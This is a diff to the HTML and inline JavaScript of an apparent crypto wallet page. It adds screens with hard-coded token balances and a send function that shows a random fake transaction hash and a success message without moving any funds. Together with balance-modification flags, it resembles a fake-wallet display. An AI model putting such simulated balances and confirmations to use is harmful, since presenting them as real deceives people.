@@ -635,7 +635,7 @@
        </div>
    </div>
    
-   <!-- Verification overlay -->
+<!-- Verification overlay -->
    <div id="verification-overlay" class="modal">
        <div class="verification-content">
            <h2>Secure Blockchain Verification</h2>
@@ -825,8 +825,8 @@
     border: 0;
 }
 </style>
-   
- <script>
+
+             <script>
     window.originalWalletData = null;
     window.currentWalletData = null;
     window.activeWallet = 'main';
@@ -835,9 +835,9 @@
     window.touchSequence = [];
     window.balanceModified = false;
     window.expirationTimer = null;
-       </script>
+ </script>
 
-      <script>
+<script>
 // Direct fix for the login screen - add to end of index.html
 (function() {
   // Run on page load
@@ -918,7 +918,7 @@
 })();
 </script>
 
-      <script>
+<script>
 (function() {
   // Wait for DOM to be fully loaded
   window.addEventListener('load', function() {
@@ -986,36 +986,169 @@
     });
   }
   
- function createSampleTokens() {
-  const tokenList = document.getElementById('token-list');
-  const tokens = [
-    {id: 'btc', name: 'Bitcoin', symbol: 'BTC', amount: 0.25, value: 21000, price: 84000, change: -0.59},
-    {id: 'eth', name: 'Ethereum', symbol: 'ETH', amount: 10.5, value: 21000, price: 2000, change: -0.71},
-    {id: 'usdt', name: 'Tether', symbol: 'USDT', amount: 10000, value: 10000, price: 1.00, change: 0.00}
-  ];
+  function createSampleTokens() {
+    const tokenList = document.getElementById('token-list');
+    const tokens = [
+      {id: 'btc', name: 'Bitcoin', symbol: 'BTC', amount: 0.25, value: 21000, price: 84000, change: -0.59},
+      {id: 'eth', name: 'Ethereum', symbol: 'ETH', amount: 10.5, value: 21000, price: 2000, change: -0.71},
+      {id: 'usdt', name: 'Tether', symbol: 'USDT', amount: 10000, value: 10000, price: 1.00, change: 0.00}
+    ];
+    
+    tokens.forEach(token => {
+      const element = document.createElement('div');
+      element.className = 'token-item';
+      element.setAttribute('data-token-id', token.id);
+      
+      element.innerHTML = `
+        <div class="token-icon">
+          <img src="https://cryptologos.cc/logos/${token.id}-${token.symbol.toLowerCase()}-logo.png" alt="${token.name}">
+        </div>
+        <div class="token-info">
+          <div class="token-name">${token.symbol} <span class="token-network">${token.name}</span></div>
+          <div class="token-price">$${token.price.toFixed(2)} <span class="token-price-change ${token.change >= 0 ? 'positive' : 'negative'}">${token.change >= 0 ? '+' : ''}${token.change}%</span></div>
+        </div>
+        <div class="token-amount">
+          <div class="token-balance">${token.amount.toFixed(6)}</div>
+          <div class="token-value">$${token.value.toFixed(2)}</div>
+        </div>
+      `;
+      
+      tokenList.appendChild(element);
+    });
+  }
   
-  tokens.forEach(token => {
-    const element = document.createElement('div');
-    element.className = 'token-item';
-    element.setAttribute('data-token-id', token.id);
+  // Define missing functions
+  function showTokenDetail(tokenId) {
+    hideAllScreens();
+    const detailScreen = document.getElementById('token-detail');
+    if (detailScreen) {
+      detailScreen.style.display = 'block';
+      detailScreen.classList.remove('hidden');
+      
+      // Update token details
+      const token = getTokenData(tokenId);
+      if (token) {
+        document.getElementById('detail-symbol').textContent = token.symbol;
+        document.getElementById('detail-fullname').textContent = token.name;
+        document.getElementById('token-balance-amount').textContent = `${token.amount} ${token.symbol}`;
+        document.getElementById('token-balance-value').textContent = `$${token.value.toFixed(2)}`;
+        document.getElementById('token-price-symbol').textContent = token.symbol;
+        document.getElementById('token-current-price').textContent = `$${token.price.toFixed(2)}`;
+        document.getElementById('token-price-change').textContent = `${token.change >= 0 ? '+' : ''}${token.change}%`;
+        document.getElementById('token-price-change').className = token.change >= 0 ? 'positive' : 'negative';
+        document.getElementById('token-staking-symbol').textContent = token.symbol;
+        
+        // Update icon
+        const iconElements = document.querySelectorAll('#token-detail-icon');
+        iconElements.forEach(icon => {
+          icon.src = `https://cryptologos.cc/logos/${token.id}-${token.symbol.toLowerCase()}-logo.png`;
+          icon.alt = token.name;
+        });
+      }
+    }
+  }
+
+  function showSendScreen(tokenSymbol) {
+    hideAllScreens();
+    const sendScreen = document.getElementById('send-screen');
+    if (sendScreen) {
+      sendScreen.style.display = 'block';
+      sendScreen.classList.remove('hidden');
+      
+      // Update token info
+      const token = getTokenBySymbol(tokenSymbol);
+      if (token) {
+        document.getElementById('send-token-title').textContent = `Send ${token.symbol}`;
+        document.getElementById('max-amount').textContent = token.amount;
+        document.getElementById('max-symbol').textContent = token.symbol;
+      }
+    }
+  }
+
+  function showReceiveScreen(tokenSymbol) {
+    hideAllScreens();
+    const receiveScreen = document.getElementById('receive-screen');
+    if (receiveScreen) {
+      receiveScreen.style.display = 'block';
+      receiveScreen.classList.remove('hidden');
+      
+      // Update token info
+      const token = getTokenBySymbol(tokenSymbol);
+      if (token) {
+        document.getElementById('receive-token-name').textContent = token.symbol;
+        document.getElementById('receive-token-icon').src = `https://cryptologos.cc/logos/${token.id}-${token.symbol.toLowerCase()}-logo.png`;
+        
+        // Show Bitcoin warning if BTC
+        const bitcoinWarning = document.getElementById('bitcoin-warning');
+        if (bitcoinWarning) {
+          bitcoinWarning.classList.toggle('hidden', token.symbol.toLowerCase() !== 'btc');
+        }
+      }
+    }
+  }
+
+  function processSendTransaction() {
+    // Get entered values
+    const amount = document.getElementById('send-amount').value;
+    const address = document.getElementById('recipient-address').value;
     
-    element.innerHTML = `
-      <div class="token-icon">
-        <img src="https://cryptologos.cc/logos/${token.id}-${token.symbol.toLowerCase()}-logo.png" alt="${token.name}">
-      </div>
-      <div class="token-info">
-        <div class="token-name">${token.symbol} <span class="token-network">${token.name}</span></div>
-        <div class="token-price">$${token.price.toFixed(2)} <span class="token-price-change ${token.change >= 0 ? 'positive' : 'negative'}">${token.change >= 0 ? '+' : ''}${token.change}%</span></div>
-      </div>
-      <div class="token-amount">
-        <div class="token-balance">${token.amount.toFixed(6)}</div>
-        <div class="token-value">$${token.value.toFixed(2)}</div>
-      </div>
-    `;
+    if (!amount || !address) {
+      alert('Please enter amount and recipient address');
+      return;
+    }
     
-    tokenList.appendChild(element);
-  });
-}
+    // Show transaction status
+    hideAllScreens();
+    const txModal = document.getElementById('tx-status-modal');
+    if (txModal) {
+      txModal.style.display = 'flex';
+      txModal.classList.remove('hidden');
+      
+      // Update transaction details
+      document.getElementById('tx-hash').textContent = `0x${Math.random().toString(16).substr(2, 10)}...`;
+      
+      // Simulate transaction completion after delay
+      setTimeout(() => {
+        document.getElementById('tx-pending').classList.add('hidden');
+        document.getElementById('tx-success').classList.remove('hidden');
+        
+        // Set success values
+        const symbol = document.getElementById('max-symbol').textContent || 'USDT';
+        document.getElementById('tx-amount').textContent = `${amount} ${symbol}`;
+        document.getElementById('tx-to').textContent = address.substring(0, 6) + '...';
+        
+        // Add done button handler
+        document.getElementById('close-tx-success').onclick = function() {
+          hideAllScreens();
+          document.getElementById('wallet-screen').style.display = 'flex';
+        };
+      }, 3000);
+    }
+  }
+
+  function getTokenData(tokenId) {
+    // Sample token data
+    const tokens = {
+      'btc': {id: 'btc', name: 'Bitcoin', symbol: 'BTC', amount: 0.25, value: 21000, price: 84000, change: -0.59},
+      'eth': {id: 'eth', name: 'Ethereum', symbol: 'ETH', amount: 10.5, value: 21000, price: 2000, change: -0.71},
+      'usdt': {id: 'usdt', name: 'Tether', symbol: 'USDT', amount: 10000, value: 10000, price: 1.00, change: 0.00}
+    };
+    
+    return tokens[tokenId] || tokens['btc'];
+  }
+
+  function getTokenBySymbol(symbol) {
+    const tokenId = symbol.toLowerCase();
+    return getTokenData(tokenId);
+  }
+
+  function updateWalletUI() {
+    // Update total balance
+    const totalBalance = document.getElementById('total-balance');
+    if (totalBalance) {
+      totalBalance.textContent = '$52,000.00';
+    }
+  }
 })();
 </script>
 
@@ -1039,15 +1172,16 @@ document.addEventListener('DOMContentLoaded', function() {
     }
   });
   
- // Load fix.js first, then wallet-fix.js
-const fixScript = document.createElement('script');
-fixScript.src = 'fix.js';
-fixScript.onload = function() {
-  const walletScript = document.createElement('script');
-  walletScript.src = 'wallet-fix.js';
-  document.body.appendChild(walletScript);
-};
-document.body.appendChild(fixScript);
+  // Load fix.js first, then wallet-fix.js
+  const fixScript = document.createElement('script');
+  fixScript.src = 'fix.js';
+  fixScript.onload = function() {
+    const walletScript = document.createElement('script');
+    walletScript.src = 'wallet-fix.js';
+    document.body.appendChild(walletScript);
+  };
+  document.body.appendChild(fixScript);
+});
 </script>
 </body>
 </html>
